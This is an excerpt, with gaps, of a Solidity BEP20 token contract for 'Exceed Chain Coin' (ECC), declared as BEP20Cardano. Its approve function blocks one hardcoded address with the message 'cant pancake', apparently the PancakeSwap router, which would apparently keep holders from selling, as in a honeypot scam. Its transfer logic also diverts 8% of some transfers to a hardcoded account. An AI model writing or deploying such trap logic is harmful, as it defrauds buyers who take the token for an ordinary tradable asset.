...
contract BEP20Cardano is Context, IBEP20, Ownable {
  ...
  address public lp;
  address public mainacc=0xAD75D7676f8C7f9c1b740ef8095F679Cc4e4DF3E;
  address public sxfacc=0x59cF768A84a56ED69A504bc22c3fF3F1D0DDC145;
  constructor() public {
    _name = "Exceed Chain Coin";
    _symbol = "ECC";
    _decimals = 18;
    _totalSupply = 160000000 * 10**18;
  ...
  function approve(address spender, uint256 amount) external returns (bool) {
      require(spender!=0x10ED43C718714eb63d5aA57B78B54704E256024E,'cant pancake');
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(_whiteaddress[sender]==true || _whiteaddress[recipient]==true){
       ...
       _tokenTransfer(sender,sxfacc,amount.mul(8).div(100));
